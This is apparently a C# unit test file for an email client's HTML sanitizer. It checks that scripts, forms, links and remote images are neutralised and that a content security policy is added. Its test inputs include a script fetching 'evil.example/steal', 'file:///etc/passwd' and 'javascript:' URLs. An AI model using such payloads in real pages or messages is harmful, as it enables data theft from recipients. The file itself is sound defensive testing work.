using OpenOutlook.Desktop;
using AngleSharp.Html.Parser;

namespace OpenOutlook.Tests;

public sealed class SafeHtmlDocumentTests
{
    [Fact]
    public void KeepsTableLayoutAndColorsWithoutBrowserNetworkUrls()
    {
        var html = """
            <html><head><style>.card { background:#343463; color:#fff; }</style></head>
            <body style="background:#18181b;color:white"><table><tr><td class="card" style="background-color:#343463">Hello</td></tr></table>
            <img src="https://images.example.com/picture.png"><img src="cid:logo">
            <script>fetch('https://evil.example/steal')</script><a href="https://evil.example">Link</a>
            </body></html>
            """;
        var sources = SafeHtmlDocument.FindImages(html);
        Assert.Equal(2, sources.Count);
        Assert.Contains(sources, source => source.Key == "cid:logo");
        var safe = SafeHtmlDocument.Build(html, new Dictionary<string, byte[]>());
        Assert.Contains("<table", safe);
        Assert.Contains("background-color", safe);
        Assert.Contains("Content-Security-Policy", safe);
        Assert.DoesNotContain("images.example.com", safe);
        Assert.Contains("data-openoutlook-url=", safe);
        Assert.DoesNotContain("<script", safe);
        Assert.DoesNotContain(" href=", safe);
    }

    [Fact]
    public void AcceptsHttpAndHttpsButRejectsPrivateImageSources()
    {
        Assert.True(SafeHtmlDocument.TrySource("http://example.com/a.png", out _));
        Assert.False(SafeHtmlDocument.TrySource("file:///etc/passwd", out _));
        Assert.False(SafeHtmlDocument.TrySource("https://127.0.0.1/a.png", out _));
        Assert.True(SafeHtmlDocument.TrySource("//images.example.com/a.png", out var source));
        Assert.True(source.ContactsExternalSite);
    }

    [Fact]
    public void ReplacesOnlyApprovedImageAndCssBackgroundWithValidatedBytes()
    {
        var png = Convert.FromBase64String(
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/l9sAAAAASUVORK5CYII=");
        var html = "<body style=\"background-image:url('https://images.example.com/bg.png')\">" +
            "<img src=\"cid:logo\"><img src=\"https://images.example.com/blocked.png\"></body>";
        var sources = SafeHtmlDocument.FindImages(html);
        Assert.Equal(3, sources.Count);
        var approved = sources.Where(source => source.Key is "cid:logo" or "remote:https://images.example.com/bg.png")
            .ToDictionary(source => source.Key, _ => png);
        var safe = SafeHtmlDocument.Build(html, approved);
        Assert.Contains("data:image/png;base64,", safe);
        Assert.DoesNotContain("images.example.com", safe);
        Assert.DoesNotContain("cid:logo", safe);
    }

    [Fact]
    public void KeepsApprovedImageInsideInertMailLink()
    {
        var png = Convert.FromBase64String(
            "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/l9sAAAAASUVORK5CYII=");
        var html = "<a href='https://example.com/open'><img src='https://images.example.com/logo.png' width='600'></a>";
        var source = Assert.Single(SafeHtmlDocument.FindImages(html));
        var safe = SafeHtmlDocument.Build(html, new Dictionary<string, byte[]> { [source.Key] = png });
        var document = new HtmlParser().ParseDocument(safe);
        var image = Assert.Single(document.QuerySelectorAll("img"));
        Assert.StartsWith("data:image/png;base64,", image.GetAttribute("src"));
        Assert.Null(document.QuerySelector("a")?.GetAttribute("href"));
        Assert.Equal("https://example.com/open", document.QuerySelector("a")?.GetAttribute("data-openoutlook-url"));
        Assert.DoesNotContain("images.example.com", safe);
    }

    [Fact]
    public void LinksAllowWebAndMailButRejectActiveSchemes()
    {
        Assert.True(SafeHtmlDocument.TryLink("https://example.test/page", out _));
        Assert.True(SafeHtmlDocument.TryLink("mailto:person@example.test", out _));
        Assert.False(SafeHtmlDocument.TryLink("javascript:alert(1)", out _));
        Assert.False(SafeHtmlDocument.TryLink("file:///etc/passwd", out _));
        Assert.False(SafeHtmlDocument.TryLink("https://user:secret@example.test", out _));
    }

    [Fact]
    public void InteractiveDocumentRestoresOnlyApprovedLinkTargets()
    {
        var interactive = SafeHtmlDocument.BuildInteractive(
            "<a href='https://example.test/read'>Read</a><a href='javascript:alert(1)'>Bad</a>",
            new Dictionary<string, byte[]>());
        var document = new HtmlParser().ParseDocument(interactive);
        var anchors = document.QuerySelectorAll("a");
        Assert.Equal("https://example.test/read", anchors[0].GetAttribute("href"));
        Assert.Null(anchors[1].GetAttribute("href"));
        Assert.DoesNotContain("<script", interactive);
    }

    [Fact]
    public void Malformed_long_message_keeps_its_end_and_isolates_active_content()
    {
        var html = "<div><table><tr><td>Start" +
            string.Concat(Enumerable.Range(0, 1500).Select(index => $"<p>Paragraph {index}</p>")) +
            "<script>window.bad = true</script><form action='https://example.test/post'><input></form>" +
            "<p>End of message</p>";
        var interactive = SafeHtmlDocument.BuildInteractive(html, new Dictionary<string, byte[]>());
        var document = new HtmlParser().ParseDocument(interactive);
        Assert.Contains("Paragraph 1499", document.Body!.TextContent);
        Assert.Contains("End of message", document.Body.TextContent);
        Assert.Null(document.QuerySelector("script,form,input"));
        Assert.Contains("default-src 'none'", document.QuerySelector("meta[http-equiv='Content-Security-Policy']")!
            .GetAttribute("content"));
    }

    [Fact]
    public void Failed_remote_image_has_visible_fallback_without_request_url()
    {
        var interactive = SafeHtmlDocument.BuildInteractive(
            "<p>Before</p><img src='https://images.example.test/unavailable.png'><p>After</p>",
            new Dictionary<string, byte[]>());
        var document = new HtmlParser().ParseDocument(interactive);
        Assert.Equal("Image unavailable", Assert.Single(document.QuerySelectorAll("img")).GetAttribute("alt"));
        Assert.DoesNotContain("images.example.test", interactive);
        Assert.Contains("Before", document.Body!.TextContent);
        Assert.Contains("After", document.Body.TextContent);
    }
}
